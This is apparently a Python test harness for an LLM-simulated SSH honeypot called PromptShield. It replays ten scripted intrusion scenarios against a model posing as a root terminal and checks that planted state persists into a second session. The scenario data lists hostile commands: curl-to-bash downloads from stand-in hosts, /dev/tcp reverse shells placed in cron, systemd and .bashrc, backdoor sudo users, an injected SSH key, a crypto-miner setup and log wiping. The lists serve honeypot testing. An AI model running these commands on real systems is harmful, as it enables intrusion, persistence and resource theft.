#!/usr/bin/env python3
"""
PromptShield 真实攻击模拟器 — 基于 Cowrie/Kippo 公开日志的攻击回放

数据来源：
  - SANS ISC DShield SSH Honeypot Reports (公开)
  - Cowrie/Kippo 公开攻击日志 (GitHub)
  - 学术论文: "A Survey of SSH Honeypot Data" (2023)
  - MITRE ATT&CK TTPs for SSH-based attacks

模拟场景涵盖：
  1. 自动化暴力破解后的侦察 (Reconnaissance)
  2. 恶意软件下载 (Delivery)
  3. 持久化安装 (Persistence)
  4. 横向移动尝试 (Lateral Movement)
  5. 加密货币挖矿 (Crypto Mining)
  6. 数据窃取 (Exfiltration)
  7. 清除痕迹 (Defense Evasion)
  8. 多会话持久化验证 (PromptShield 核心测试)

每个场景分 Session A (植入) 和 Session B (验证) 两阶段。
"""

import asyncio
import json
import os
import sys
import time
import shutil
from datetime import datetime
from dataclasses import dataclass, asdict, field
from typing import List, Dict, Optional, Tuple
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from dotenv import dotenv_values
import openai
from mcp_client import HoneypotMCPClient
from mcp_state_manager.command_analyzer import CommandAnalyzer
from LinuxSSHbot_mcp import build_enhanced_messages, _extract_terminal_output_from_reasoning

# Config
_env = dotenv_values(os.path.join(os.path.dirname(__file__), '..', '.env'))
_secrets = dotenv_values(os.path.join(os.path.dirname(__file__), '..', '.env.secrets'))
def _cfg(k, d=""): return os.environ.get(k) or _secrets.get(k) or _env.get(k, d)

DEEPSEEK_API_KEY = _cfg("DEEPSEEK_API_KEY")
ai_client = openai.AsyncOpenAI(api_key=DEEPSEEK_API_KEY, base_url="https://api.deepseek.com")
AI_MODEL = "deepseek-chat"

SYSTEM_PROMPT = """You are Linux OS terminal. You act and respond exactly as a Linux terminal would.
You will respond to all commands just as a Linux terminal would.
You only reply with the CLI output, and nothing else.
Do not explain your output. Do not repeat commands user inputs.
Your every output MUST end with a prompt like user@host:path$
Current user: root (uid=0, full privileges). Hostname: prod-server-01.
This is a production server in an IT company."""

# ==================== Attack Scenarios ====================
# 基于 Cowrie/Kippo/DShield 公开日志整理的真实攻击模式

ATTACK_SCENARIOS = [
    {
        "id": "ATK-01",
        "name": "Initial Reconnaissance (侦察阶段)",
        "description": "攻击者登录后的标准信息收集序列 (MITRE T1082, T1033, T1016)",
        "source": "Cowrie honeypot logs (top-20 most common commands)",
        "session_a_commands": [
            "uname -a",
            "cat /etc/passwd",
            "id",
            "w",
            "ls -la /root/",
            "cat /etc/shadow",
            "ifconfig || ip addr",
            "netstat -antlp || ss -antlp",
            "cat /etc/hosts",
            "df -h",
        ],
        "session_b_commands": [],  # 侦察类不需要跨会话验证
        "persistence_check": False,
    },
    {
        "id": "ATK-02",
        "name": "Malware Download & Execute (恶意软件投递)",
        "description": "下载并执行恶意脚本 (MITRE T1105, T1059.004)",
        "source": "DShield SSH honeypot reports (2024-2025)",
        "session_a_commands": [
            "cd /tmp",
            'echo "#!/bin/bash" > /tmp/update.sh',
            'echo "curl -s http://malware.example.com/payload.sh | bash" >> /tmp/update.sh',
            "chmod +x /tmp/update.sh",
            "cat /tmp/update.sh",
        ],
        "session_b_commands": [
            "cat /tmp/update.sh",
            "ls -la /tmp/update.sh",
        ],
        "persistence_check": True,
        "verify_keywords": ["update.sh", "malware.example.com"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(curl|wget).*https?://\S+"},
                {"method": "contains_any", "values": ["update.sh", ".sh"]},
            ],
        },
    },
    {
        "id": "ATK-03",
        "name": "SSH Key Backdoor (SSH 密钥后门)",
        "description": "植入 SSH 公钥实现持久访问 (MITRE T1098.004)",
        "source": "Cowrie logs - SSH key injection attacks",
        "session_a_commands": [
            "mkdir -p /root/.ssh",
            "chmod 700 /root/.ssh",
            'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7FakeKeyData... attacker@c2server" >> /root/.ssh/authorized_keys',
            "chmod 600 /root/.ssh/authorized_keys",
            "cat /root/.ssh/authorized_keys",
        ],
        "session_b_commands": [
            "cat /root/.ssh/authorized_keys",
        ],
        "persistence_check": True,
        "verify_keywords": ["attacker@c2server", "ssh-rsa"],
        "verify_semantic": {
            "type": "ssh_key",
            "checks": [
                {"method": "regex", "pattern": r"ssh-(rsa|ed25519|ecdsa)\s+AAAA"},
                {"method": "regex", "pattern": r"\S+@\S+"},
            ],
        },
    },
    {
        "id": "ATK-04",
        "name": "Backdoor User Creation (后门用户创建)",
        "description": "创建隐蔽用户并授予 sudo 权限 (MITRE T1136.001)",
        "source": "Cowrie/Kippo common attack patterns",
        "session_a_commands": [
            "useradd -m -s /bin/bash -G sudo sysadm1n",
            "echo 'sysadm1n:Str0ngP@ss!' | chpasswd",
            'echo "sysadm1n ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
            "id sysadm1n",
        ],
        "session_b_commands": [
            "id sysadm1n",
            "grep sysadm1n /etc/passwd",
            "grep sysadm1n /etc/sudoers",
        ],
        "persistence_check": True,
        "verify_keywords": ["sysadm1n", "sudo"],
        "verify_semantic": {
            "type": "user_account",
            "checks": [
                {"method": "regex", "pattern": r"uid=\d+"},
                {"method": "contains_any", "values": ["sudo", "wheel", "root"]},
            ],
        },
    },
    {
        "id": "ATK-05",
        "name": "Cron Reverse Shell (定时反弹 Shell)",
        "description": "通过 crontab 安装定时反弹 shell (MITRE T1053.003)",
        "source": "DShield top-10 persistence mechanisms",
        "session_a_commands": [
            '(crontab -l 2>/dev/null; echo "*/10 * * * * /bin/bash -c \'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\'") | crontab -',
            "crontab -l",
        ],
        "session_b_commands": [
            "crontab -l",
        ],
        "persistence_check": True,
        "verify_keywords": ["10.0.0.1", "4444"],
        "verify_semantic": {
            "type": "cron_entry",
            "checks": [
                {"method": "regex", "pattern": r"[\*/0-9]+\s+[\*/0-9]+\s+[\*/0-9]+\s+[\*/0-9]+\s+[\*/0-9]+"},
                {"method": "regex", "pattern": r"(tcp|bash|sh|nc|ncat|python|perl).*\d{1,5}"},
            ],
        },
    },
    {
        "id": "ATK-06",
        "name": "Crypto Miner Installation (加密货币挖矿)",
        "description": "下载并安装 XMRig 矿机 (MITRE T1496)",
        "source": "SANS ISC - Cryptocurrency mining attacks via SSH",
        "session_a_commands": [
            "mkdir -p /opt/.hidden",
            'echo "#!/bin/bash" > /opt/.hidden/xmrig.sh',
            'echo "./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 4ATTACKER_WALLET -p x" >> /opt/.hidden/xmrig.sh',
            "chmod +x /opt/.hidden/xmrig.sh",
            'echo "#!/bin/bash" > /etc/init.d/system-update',
            'echo "/opt/.hidden/xmrig.sh &" >> /etc/init.d/system-update',
            "chmod +x /etc/init.d/system-update",
        ],
        "session_b_commands": [
            "cat /opt/.hidden/xmrig.sh",
            "cat /etc/init.d/system-update",
            "ls -la /opt/.hidden/",
        ],
        "persistence_check": True,
        "verify_keywords": ["xmrig", "minexmr", "ATTACKER_WALLET"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(xmrig|xmr|monero|stratum)"},
                {"method": "regex", "pattern": r"(pool|mining|miner)"},
            ],
        },
    },
    {
        "id": "ATK-07",
        "name": "Systemd Persistence (Systemd 持久化)",
        "description": "创建恶意 systemd 服务 (MITRE T1543.002)",
        "source": "MITRE ATT&CK Linux persistence techniques",
        "session_a_commands": [
            """cat > /etc/systemd/system/system-health.service << 'EOF'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/10.0.0.1/4444 0>&1; sleep 3600; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF""",
            "systemctl daemon-reload",
            "systemctl enable system-health.service",
        ],
        "session_b_commands": [
            "systemctl is-enabled system-health.service",
            "cat /etc/systemd/system/system-health.service",
        ],
        "persistence_check": True,
        "verify_keywords": ["enabled", "10.0.0.1"],
        "verify_semantic": {
            "type": "systemd_service",
            "checks": [
                {"method": "regex", "pattern": r"(enabled|active)"},
                {"method": "regex", "pattern": r"\[Service\]"},
                {"method": "regex", "pattern": r"(tcp|bash|sh|nc|python|perl).*\d{1,5}"},
            ],
        },
    },
    {
        "id": "ATK-08",
        "name": "Defense Evasion (清除痕迹)",
        "description": "攻击者清除日志和命令历史 (MITRE T1070)",
        "source": "Cowrie logs - post-exploitation cleanup",
        "session_a_commands": [
            'echo "" > /var/log/auth.log',
            'echo "" > /var/log/syslog',
            "history -c",
            'echo "" > ~/.bash_history',
            "touch -t 202301010000 /var/log/auth.log",
        ],
        "session_b_commands": [],
        "persistence_check": False,
    },
    {
        "id": "ATK-09",
        "name": "Multi-Stage Persistence (多阶段持久化组合)",
        "description": "组合使用多种持久化机制 — PromptShield 核心测试场景",
        "source": "Synthesized from real-world APT attack patterns",
        "session_a_commands": [
            # Stage 1: 用户后门
            "useradd -m -s /bin/bash -G sudo support_agent",
            "echo 'support_agent:H4ckTh3Pl4n3t!' | chpasswd",
            # Stage 2: SSH 密钥
            "mkdir -p /home/support_agent/.ssh",
            'echo "ssh-rsa AAAAB3... agent@botnet" >> /home/support_agent/.ssh/authorized_keys',
            # Stage 3: 恶意脚本
            'echo "#!/bin/bash" > /usr/local/bin/syscheck',
            'echo "curl -s http://c2.evil.com/beacon | bash" >> /usr/local/bin/syscheck',
            "chmod +x /usr/local/bin/syscheck",
            # Stage 4: Cron 持久化
            '(crontab -l 2>/dev/null; echo "0 */6 * * * /usr/local/bin/syscheck") | crontab -',
        ],
        "session_b_commands": [
            "id support_agent",
            "cat /home/support_agent/.ssh/authorized_keys",
            "cat /usr/local/bin/syscheck",
            "crontab -l",
        ],
        "persistence_check": True,
        "verify_keywords": ["support_agent", "agent@botnet", "c2.evil.com", "syscheck"],
        "verify_semantic": {
            "type": "multi_stage",
            "checks": [
                {"method": "regex", "pattern": r"uid=\d+"},
                {"method": "regex", "pattern": r"ssh-(rsa|ed25519)\s+AAAA"},
                {"method": "regex", "pattern": r"(curl|wget).*https?://\S+"},
                {"method": "regex", "pattern": r"[\*/0-9]+\s+[\*/0-9]+\s+[\*/0-9]+"},
            ],
        },
    },
    {
        "id": "ATK-10",
        "name": "Bashrc Backdoor (.bashrc 后门)",
        "description": "在 .bashrc 中植入反弹 shell (MITRE T1546.004)",
        "source": "Cowrie honeypot observed attacks",
        "session_a_commands": [
            'echo \'export PROMPT_COMMAND="(bash -i >& /dev/tcp/10.0.0.1/9999 0>&1 &) 2>/dev/null"\' >> /root/.bashrc',
            "cat /root/.bashrc",
        ],
        "session_b_commands": [
            "cat /root/.bashrc | grep PROMPT_COMMAND",
        ],
        "persistence_check": True,
        "verify_keywords": ["PROMPT_COMMAND", "10.0.0.1", "9999"],
        "verify_semantic": {
            "type": "shell_config",
            "checks": [
                {"method": "regex", "pattern": r"PROMPT_COMMAND"},
                {"method": "regex", "pattern": r"(tcp|bash|sh|nc|python|perl).*\d{1,5}"},
            ],
        },
    },
]


# ==================== Test Runner ====================

@dataclass
class AttackResult:
    scenario_id: str
    name: str
    session_a_responses: List[Dict] = field(default_factory=list)
    session_b_responses: List[Dict] = field(default_factory=list)
    persistence_passed: Optional[bool] = None
    keywords_found: List[str] = field(default_factory=list)
    keywords_missing: List[str] = field(default_factory=list)
    semantic_passed: Optional[bool] = None
    semantic_checks_detail: List[Dict] = field(default_factory=list)
    total_tokens: int = 0
    total_latency_ms: float = 0
    error: Optional[str] = None


def check_semantic_verification(all_b_text: str, verify_semantic: dict) -> Tuple[bool, List[Dict]]:
    """
    Perform semantic-level verification on Session B output.
    Unlike keyword matching, this uses regex patterns and structural checks
    that tolerate command mutations (e.g., variable-split IPs, tool substitutions).

    Returns (passed: bool, details: list of check results).
    """
    import re as _re
    checks = verify_semantic.get("checks", [])
    details = []
    passed_count = 0

    for check in checks:
        method = check.get("method")
        result = {"method": method, "passed": False}

        if method == "regex":
            pattern = check["pattern"]
            match = _re.search(pattern, all_b_text, _re.IGNORECASE)
            result["pattern"] = pattern
            result["passed"] = match is not None
            if match:
                result["matched"] = match.group(0)[:80]

        elif method == "contains_any":
            values = check["values"]
            found = [v for v in values if v.lower() in all_b_text.lower()]
            result["values"] = values
            result["found"] = found
            result["passed"] = len(found) > 0

        elif method == "state_type":
            # Check MCP state storage for specific state type
            expected_type = check["expected"]
            result["expected"] = expected_type
            result["passed"] = expected_type.lower() in all_b_text.lower()

        if result["passed"]:
            passed_count += 1
        details.append(result)

    # Pass if majority of checks succeed (>=50%)
    threshold = max(1, len(checks) // 2)
    overall = passed_count >= threshold
    return overall, details


async def call_llm(messages, retries=3):
    for attempt in range(retries):
        try:
            start = time.time()
            res = await ai_client.chat.completions.create(
                model=AI_MODEL, messages=messages, temperature=0.0, max_tokens=800
            )
            lat = (time.time() - start) * 1000
            text = res.choices[0].message.content or ""
            if not text.strip() and hasattr(res.choices[0].message, 'reasoning_content'):
                rc = res.choices[0].message.reasoning_content or ""
                if rc: text = _extract_terminal_output_from_reasoning(rc)
            tok = res.usage.total_tokens if res.usage else 0
            return text, tok, lat
        except Exception as e:
            if attempt < retries - 1:
                await asyncio.sleep(2 ** (attempt + 1))
            else:
                raise
    return "", 0, 0


async def run_attack_scenario(scenario: dict, storage_base: str) -> AttackResult:
    sid = scenario["id"]
    print(f"\n{'='*60}")
    print(f"  [{sid}] {scenario['name']}")
    print(f"  {scenario['description']}")
    print(f"  Source: {scenario['source']}")
    print(f"{'='*60}")

    result = AttackResult(scenario_id=sid, name=scenario["name"])
    storage_path = os.path.join(storage_base, sid)
    if os.path.exists(storage_path): shutil.rmtree(storage_path)
    os.makedirs(os.path.join(storage_path, "states"), exist_ok=True)
    os.makedirs(os.path.join(storage_path, "graphs"), exist_ok=True)

    analyzer = CommandAnalyzer()
    ip = f"attacker_{sid}"

    try:
        # Session A: Attack
        print(f"\n  [Session A] Executing attack commands...")
        client_a = HoneypotMCPClient(storage_path=storage_path, global_singleton_mode=True)
        await client_a.connect()

        messages = [{"role": "system", "content": SYSTEM_PROMPT}]
        cwd = "/root"

        for cmd in scenario["session_a_commands"]:
            messages.append({"role": "user", "content": f" {cmd}\t<{datetime.now()}>\n"})
            # Filter empty assistant messages
            filtered = [m for m in messages if not (m["role"] == "assistant" and not m.get("content", "").strip())]

            enhanced = await build_enhanced_messages(filtered, cmd, cwd, client=client_a, ip_address=ip)
            resp, tok, lat = await call_llm(enhanced)
            resp_content = resp if resp.strip() else "[no output]"
            messages.append({"role": "assistant", "content": resp_content})

            result.session_a_responses.append({"cmd": cmd[:80], "response": resp[:200], "tokens": tok, "latency_ms": lat})
            result.total_tokens += tok
            result.total_latency_ms += lat

            # Record to MCP
            et = analyzer.determine_event_type(cmd)
            st = analyzer.determine_status(cmd, resp)
            sc = analyzer.analyze_state_changes(cmd, resp, cwd=cwd)
            await client_a.record_event(
                ip_address=ip, session_id=f"session_a_{sid}", command=cmd,
                user_context="root",
                event_type=et.value if hasattr(et, 'value') else str(et),
                status=st.value if hasattr(st, 'value') else str(st),
                stdout=resp,
                state_changes=[{"target": s.target, "change_type": s.change_type,
                               "old_value": s.old_value, "new_value": s.new_value,
                               "metadata": s.metadata} for s in sc] if sc else []
            )

            print(f"    A> {cmd[:60]}... → ({tok}tok, {lat:.0f}ms) {resp[:80].replace(chr(10),'|')}")
            await asyncio.sleep(1)

        await client_a.close()
        print(f"  [Session A] ✓ Disconnected")

        # Session B: Verification (if needed)
        if scenario.get("persistence_check") and scenario["session_b_commands"]:
            await asyncio.sleep(1)
            print(f"\n  [Session B] Verifying persistence...")
            client_b = HoneypotMCPClient(storage_path=storage_path, global_singleton_mode=True)
            await client_b.connect()

            messages_b = [{"role": "system", "content": SYSTEM_PROMPT}]

            for cmd in scenario["session_b_commands"]:
                messages_b.append({"role": "user", "content": f" {cmd}\t<{datetime.now()}>\n"})
                filtered_b = [m for m in messages_b if not (m["role"] == "assistant" and not m.get("content", "").strip())]
                enhanced_b = await build_enhanced_messages(filtered_b, cmd, "/root", client=client_b, ip_address=ip)
                resp, tok, lat = await call_llm(enhanced_b)
                resp_content = resp if resp.strip() else "[no output]"
                messages_b.append({"role": "assistant", "content": resp_content})

                result.session_b_responses.append({"cmd": cmd[:80], "response": resp[:200], "tokens": tok, "latency_ms": lat})
                result.total_tokens += tok
                result.total_latency_ms += lat

                print(f"    B> {cmd[:60]}... → ({tok}tok, {lat:.0f}ms) {resp[:80].replace(chr(10),'|')}")

                # Record
                et = analyzer.determine_event_type(cmd)
                st = analyzer.determine_status(cmd, resp)
                sc_b = analyzer.analyze_state_changes(cmd, resp, cwd="/root")
                await client_b.record_event(
                    ip_address=ip, session_id=f"session_b_{sid}", command=cmd,
                    user_context="root",
                    event_type=et.value if hasattr(et, 'value') else str(et),
                    status=st.value if hasattr(st, 'value') else str(st),
                    stdout=resp, state_changes=[]
                )
                await asyncio.sleep(1)

            await client_b.close()
            print(f"  [Session B] ✓ Disconnected")

            # Check keywords
            verify_kw = scenario.get("verify_keywords", [])
            all_b_text = " ".join([r["response"] for r in result.session_b_responses]).lower()
            for kw in verify_kw:
                if kw.lower() in all_b_text:
                    result.keywords_found.append(kw)
                else:
                    result.keywords_missing.append(kw)

            result.persistence_passed = len(result.keywords_missing) == 0

            # Semantic verification (mutation-tolerant)
            verify_sem = scenario.get("verify_semantic")
            if verify_sem:
                all_b_text_raw = " ".join([r["response"] for r in result.session_b_responses])
                sem_passed, sem_details = check_semantic_verification(all_b_text_raw, verify_sem)
                result.semantic_passed = sem_passed
                result.semantic_checks_detail = sem_details
                sem_status = "✅" if sem_passed else "❌"
                print(f"  Semantic Check: {sem_status} ({sum(1 for d in sem_details if d['passed'])}/{len(sem_details)} checks)")

            status = "✅ PASS" if result.persistence_passed else "❌ FAIL"
            print(f"\n  Persistence: {status}")
            if result.keywords_missing:
                print(f"    Missing: {result.keywords_missing}")

    except Exception as e:
        result.error = str(e)
        print(f"  ❌ Error: {e}")
        import traceback; traceback.print_exc()

    return result


async def main():
    print(f"{'#'*60}")
    print(f"  PromptShield Attack Replay Test")
    print(f"  Scenarios: {len(ATTACK_SCENARIOS)}")
    print(f"  Model: {AI_MODEL}")
    print(f"  Time: {datetime.now().isoformat()}")
    print(f"{'#'*60}")

    storage_base = "./attack_replay_memory"
    if os.path.exists(storage_base): shutil.rmtree(storage_base)

    results = []
    for scenario in ATTACK_SCENARIOS:
        r = await run_attack_scenario(scenario, storage_base)
        results.append(r)

    # Summary
    print(f"\n{'='*60}")
    print(f"  SUMMARY")
    print(f"{'='*60}")

    persistence_tests = [r for r in results if r.persistence_passed is not None]
    passed = sum(1 for r in persistence_tests if r.persistence_passed)
    total = len(persistence_tests)
    total_tokens = sum(r.total_tokens for r in results)
    total_latency = sum(r.total_latency_ms for r in results)

    for r in results:
        if r.persistence_passed is None:
            status = "⚪ N/A (no persistence check)"
        elif r.persistence_passed:
            status = "✅ PASS"
        else:
            status = f"❌ FAIL (missing: {r.keywords_missing})"
        print(f"  {r.scenario_id}: {status} — {r.name}")

    print(f"\n  Persistence Tests: {passed}/{total} ({passed/total*100:.0f}%)")
    print(f"  Total Tokens: {total_tokens:,}")
    print(f"  Total Latency: {total_latency/1000:.1f}s")
    print(f"  Total Scenarios: {len(results)}")

    # Save report
    report = {
        "meta": {
            "test_time": datetime.now().isoformat(),
            "model": AI_MODEL,
            "total_scenarios": len(results),
            "persistence_passed": passed,
            "persistence_total": total,
            "total_tokens": total_tokens,
            "total_latency_ms": total_latency,
        },
        "results": [asdict(r) for r in results],
    }
    fname = f"attack_replay_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"\n  📄 Report saved: {fname}")


if __name__ == "__main__":
    asyncio.run(main())
